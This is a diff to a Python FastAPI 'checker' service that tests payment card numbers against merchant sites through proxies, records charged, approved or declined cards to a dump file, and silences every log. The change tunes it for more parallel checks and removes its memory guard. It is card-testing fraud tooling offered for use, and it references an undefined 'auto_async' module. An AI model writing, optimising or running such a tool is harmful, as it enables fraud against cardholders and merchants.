@@ -1,4 +1,4 @@
-# checker_api2.py - كامل مع receipt_url
+# checker_api2.py - نسخة محسنة للسرعة القصوى
 
 from __future__ import annotations
 
@@ -26,17 +26,29 @@ from fastapi.responses import JSONResponse
 
 import checker_async
 
-try:
-    import psutil
-    MEMORY_CHECK_ENABLED = True
-except ImportError:
-    psutil = None
-    MEMORY_CHECK_ENABLED = False
+# ===== إعدادات السرعة =====
+CONCURRENT_PER_SITE = int(os.environ.get("CONCURRENT_PER_SITE", "5"))
+POLL_ATTEMPTS = int(os.environ.get("POLL_ATTEMPTS", "8"))
+POLL_DELAY_MS = int(os.environ.get("POLL_DELAY_MS", "80"))
 
-MEMORY_LIMIT_PERCENT = 90
+# تحديث إعدادات checker_async
+checker_async.CONCURRENT_PER_SITE = CONCURRENT_PER_SITE
+auto_async.POLL_ATTEMPTS = POLL_ATTEMPTS
+auto_async.POLL_DELAY_MS = POLL_DELAY_MS
+
+# ===== إخفاء الـ logs =====
+sys.stdout = open(os.devnull, 'w')
+sys.stderr = open(os.devnull, 'w')
+
+logging.basicConfig(level=logging.CRITICAL)
+for name in logging.root.manager.loggerDict:
+    logging.getLogger(name).disabled = True
+    logging.getLogger(name).handlers = []
+
+for name in ["uvicorn", "uvicorn.access", "uvicorn.error", "uvicorn.asgi"]:
+    logging.getLogger(name).disabled = True
 
 PORT = int(os.environ.get("CHECKER_PORT", os.environ.get("PORT", "6667")))
-stats_lock = asyncio.Lock()
 
 _stats = {
     "active":   0,
@@ -47,41 +59,16 @@ _stats = {
     "errors":   0,
     "by":       "VeNoM",
     "started":  time.strftime("%Y-%m-%d %H:%M:%S"),
+    "workers":  CONCURRENT_PER_SITE,
 }
 
-# ===== إخفاء جميع الـ Logs =====
-sys.stdout = open(os.devnull, 'w')
-sys.stderr = open(os.devnull, 'w')
+_stats_lock = asyncio.Lock()
 
-logging.basicConfig(level=logging.CRITICAL)
-for name in logging.root.manager.loggerDict:
-    logging.getLogger(name).disabled = True
-    logging.getLogger(name).handlers = []
-
-logging.getLogger("uvicorn").disabled = True
-logging.getLogger("uvicorn.access").disabled = True
-logging.getLogger("uvicorn.error").disabled = True
-
-def _render_live() -> None:
-    pass
-
-def _update_live(card: str = "", status: str = "", response: str = "") -> None:
-    pass
-
-def is_memory_exceeded() -> bool:
-    if not MEMORY_CHECK_ENABLED or psutil is None:
-        return False
-    try:
-        mem = psutil.virtual_memory()
-        return mem.percent >= MEMORY_LIMIT_PERCENT
-    except Exception:
-        return False
-
-def _save_dump(card: str, site: str, status: str, result: str, amount: str, receipt_url: str = ""):
+def _save_dump(card: str, site: str, status: str, result: str, amount: str):
     try:
         with open("dump.txt", "a", encoding="utf-8") as f:
             timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            line = f"[{timestamp}] {status.upper()} | {card} | {site} | {result} | ${amount} | {receipt_url}\n"
+            line = f"[{timestamp}] {status.upper()} | {card} | {site} | {result} | ${amount}\n"
             f.write(line)
             f.flush()
     except Exception:
@@ -105,9 +92,6 @@ async def check(
     proxy: Optional[str] = Query(None),
     max_price: Optional[float] = Query(20.0),
 ):
-    if is_memory_exceeded():
-        return JSONResponse({"error": "Server is busy"}, status_code=503)
-
     if request.method == "POST":
         try:
             body = await request.json()
@@ -123,7 +107,7 @@ async def check(
     if not site:
         return JSONResponse({"error": "Missing site"}, status_code=400)
 
-    async with stats_lock:
+    async with _stats_lock:
         _stats["active"] += 1
         _stats["total"]  += 1
 
@@ -132,7 +116,7 @@ async def check(
     try:
         result = await checker_async.check_card_async(cc, site, proxy or "", max_price)
     except Exception as e:
-        async with stats_lock:
+        async with _stats_lock:
             _stats["errors"] += 1
             _stats["active"] -= 1
         return JSONResponse({
@@ -143,19 +127,17 @@ async def check(
             "Card":     cc,
             "site":     site,
             "elapsed":  round(asyncio.get_event_loop().time() - t0, 2),
-            "receipt_url": "",
         })
 
     elapsed = round(asyncio.get_event_loop().time() - t0, 2)
     status  = result.get("status", "error")
-    receipt_url = result.get("receipt_url", "")
 
-    async with stats_lock:
+    async with _stats_lock:
         _stats[{"charged":"charged","approved":"approved","declined":"declined"}.get(status,"errors")] += 1
         _stats["active"] -= 1
 
     if status in ("charged", "approved", "declined"):
-        _save_dump(cc, site, status, result.get("result", ""), result.get("amount", "0"), receipt_url)
+        _save_dump(cc, site, status, result.get("result", ""), result.get("amount", "0"))
 
     bot_status = {"charged":"Charged","approved":"Approved","declined":"Declined"}.get(status,"SiteError")
 
@@ -167,7 +149,6 @@ async def check(
         "Card":     cc,
         "site":     site,
         "elapsed":  elapsed,
-        "receipt_url": receipt_url,
     })
 
 if __name__ == "__main__":
@@ -178,8 +159,9 @@ if __name__ == "__main__":
         loop="uvloop",
         access_log=False,
         log_level="critical",
-        backlog=4096,
-        timeout_keep_alive=30,
-        workers=2,
+        backlog=8192,
+        timeout_keep_alive=15,
+        workers=4,
+        limit_concurrency=200,
         log_config=None,
     )
